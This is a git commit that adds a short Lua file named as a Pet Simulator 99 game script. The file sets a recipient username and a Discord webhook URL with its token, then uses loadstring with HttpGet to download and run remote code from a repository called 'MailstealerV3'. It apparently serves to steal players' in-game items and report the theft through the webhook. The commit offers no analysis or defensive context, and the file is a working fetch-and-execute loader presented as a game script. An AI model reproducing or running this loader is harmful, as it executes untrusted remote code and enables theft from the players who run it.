aa37276fa5447a1003d63ffad7295b875b03f9fd
LenoR <157439091+robdudman@users.noreply.github.com>
2024-01-23 03:05:22 +0100

    Add files via upload

---
+++ PetSim99Script.lua
@@ -0,0 +1,4 @@
+Username = "kizimizi1337"
+Webhook = "https://discord.com/api/webhooks/1199161354305667092/KTkF_gVRyTHe9RePOZI5CLcCeP99LpQ9SmuVQ20sAqfCmTWbz1JJhbwC9ztVxLhgL4sd"
+LoadingScreen = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Egorikusa/MailstealerV3/main/main"))()
